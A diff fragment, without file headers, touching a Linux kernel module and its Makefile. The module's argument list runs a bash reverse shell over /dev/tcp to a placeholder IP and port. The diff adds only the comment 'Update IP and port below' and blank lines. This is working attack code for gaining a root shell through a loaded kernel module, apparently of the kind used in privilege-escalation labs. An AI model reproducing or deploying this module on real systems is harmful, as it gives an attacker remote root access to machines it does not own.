@@ -1,6 +1,7 @@
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_VERSION("1.0");
+/* Update IP and port below */
 char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.0.1.XX/YYYY 0>&1",
 NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/
@@ -24,3 +25,6 @@ all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+		
+		
